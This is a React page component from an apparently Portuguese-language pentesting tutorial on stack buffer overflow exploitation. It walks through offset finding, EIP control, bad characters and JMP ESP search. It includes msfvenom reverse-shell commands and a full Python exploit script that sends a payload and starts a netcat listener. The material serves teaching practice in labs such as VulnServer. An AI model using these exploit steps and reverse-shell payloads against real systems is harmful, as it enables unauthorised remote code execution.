import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function BufferOverflow() {
    return (
      <PageContainer
        title="Buffer Overflow — Fundamentos"
        subtitle="Entenda como explorar vulnerabilidades de estouro de buffer para executar código arbitrário."
        difficulty="avancado"
        timeToRead="20 min"
      >
        <AlertBox type="info" title="Fundamental para CTFs e exploits reais">
          Buffer overflow é a base de muitos exploits clássicos. Entender essa vulnerabilidade
          é essencial para qualquer pentester sério. Pratique em ambientes como TryHackMe e HackTheBox.
        </AlertBox>

        <h2>O que é Buffer Overflow?</h2>
        <p>
          Um buffer overflow ocorre quando um programa escreve mais dados em um buffer do que ele
          comporta, sobrescrevendo memória adjacente. Se o endereço de retorno de uma função for
          sobrescrito com um endereço que o atacante controla, ele pode redirecionar a execução
          para código malicioso (shellcode).
        </p>

        <h2>Identificar o Offset (EIP Control)</h2>
        <CodeBlock language="bash" code={'# 1. Gerar padrão único de Metasploit (para encontrar offset)\nmsf-pattern_create -l 2000 > pattern.txt\n\n# 2. Enviar para o programa vulnerável\npython3 -c \'\nimport socket\n\npattern = open("pattern.txt").read()\ns = socket.socket()\ns.connect((\"192.168.1.100\", 9999))\ns.send(pattern.encode())\ns.close()\n\'\n\n# 3. No debugger (Immunity Debugger ou gdb), ver o valor em EIP\n# EIP: 386F4337\n\n# 4. Calcular offset\nmsf-pattern_offset -l 2000 -q 386F4337\n# Resultado: offset = 1978'} />

        <h2>Controlar EIP</h2>
        <CodeBlock language="bash" code={'# Verificar controle do EIP\npython3 -c \'\nimport socket\n\noffset = 1978\npayload = b"A" * offset + b"BBBB"  # 42424242 no EIP = sucesso!\n\ns = socket.socket()\ns.connect((\"192.168.1.100\", 9999))\ns.send(payload)\ns.close()\n\'\n\n# No debugger, EIP deve mostrar: 42424242'} />

        <h2>Encontrar Bad Characters</h2>
        <CodeBlock language="bash" code={'# Gerar lista de bad chars (exceto \\x00 que quase sempre é bad)\nbadchars = b""\nfor i in range(1, 256):\n    badchars += bytes([i])\n\n# Enviar e analisar no debugger\n# Comparar bytes enviados com bytes na memória\n# Bytes faltantes = bad characters\n\n# Escrever em Python:\nbadchars_str = \'\\x01\\x02\\x03...\\xff\'  # todos exceto \\x00\n\n# Após identificar, evitar bad chars no shellcode!'} />

        <h2>Encontrar JMP ESP (Return Address)</h2>
        <CodeBlock language="bash" code={'# Precisamos de um endereço que faça JMP ESP\n# para pular para nosso shellcode na stack\n\n# No Immunity Debugger:\n# !mona jmp -r esp -cpb "\\x00\\x0a\\x0d"  # excluir bad chars\n\n# Via msfpescan\nmsf-msfpescan -j esp ./vulnerable_dll.dll\n\n# Via gdb + ropper\nropper --file /path/to/executable --search "jmp esp"\n\n# Anotar o endereço (ex: 0x625011af)\n# Lembrar: endereço em little-endian!\n# 0x625011af → b"\\xaf\\x11\\x50\\x62"'} />

        <h2>Gerar Shellcode</h2>
        <CodeBlock language="bash" code={'# Shellcode com msfvenom\nmsfvenom -p windows/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 \\\n  -b "\\x00\\x0a\\x0d" -f python\n\n# Para Linux\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 \\\n  -b "\\x00" -f python\n\n# Shellcode cru (x86 Linux - execve /bin/sh)\n# \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68...'} />

        <h2>Exploit Completo</h2>
        <CodeBlock language="python" code={'import socket\n\nhost = "192.168.1.100"\nport = 9999\n\n# Valores encontrados durante análise\noffset = 1978\njmp_esp = b"\\xaf\\x11\\x50\\x62"  # endereço em little-endian\nnops = b"\\x90" * 32  # NOP sled\n\n# Shellcode gerado pelo msfvenom (windows/shell_reverse_tcp)\nshellcode = (\n    b"\\xdb\\xd4\\xd9\\x74\\x24\\xf4..."  # shellcode real aqui\n)\n\npayload = b"A" * offset + jmp_esp + nops + shellcode\n\nprint(f"[*] Payload: {len(payload)} bytes")\n\n# Listener\nimport subprocess\nsubprocess.Popen(["nc", "-lvnp", "4444"])\n\ns = socket.socket()\ns.connect((host, port))\nprint("[*] Enviando exploit...")\ns.send(payload)\ns.close()\nprint("[+] Exploit enviado! Aguardando shell...")'} />

        <AlertBox type="success" title="Praticando Buffer Overflow">
          TryHackMe tem a sala "Buffer Overflow Prep" excelente para iniciantes.
          VulnHub tem o VulnServer (Windows x86 sem proteções) perfeito para prática.
          Pwntools facilita muito a escrita de exploits Python profissionais.
        </AlertBox>
      </PageContainer>
    );
  }
  